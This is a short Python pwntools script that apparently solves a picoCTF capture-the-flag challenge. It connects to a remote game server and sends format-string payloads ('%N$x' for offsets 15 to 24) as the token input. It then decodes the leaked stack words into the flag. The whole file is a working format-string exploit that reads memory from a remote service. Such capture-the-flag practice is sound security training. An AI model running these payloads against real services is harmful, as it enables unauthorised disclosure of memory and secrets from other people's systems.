#!/usr/bin/python3
from pwn import *
import struct

flag = b''
for i in range(15, 25):
    # Connect to port
    p = remote("mercury.picoctf.net", 33411)

    # Send 1 (buy stonks)
    p.sendline(b"1")

    # Receive until token?
    p.recvuntil(b'token?\n')

    # Send payload
    payload = b'%' + str(i).encode() + b'$x'

    p.sendline(payload)

    # Receive until token:
    p.recvuntil(b'token:\n')

    output = p.recvline()[:-1]

    hexval = struct.pack("I", int(output,16))

    flag += hexval

print(flag)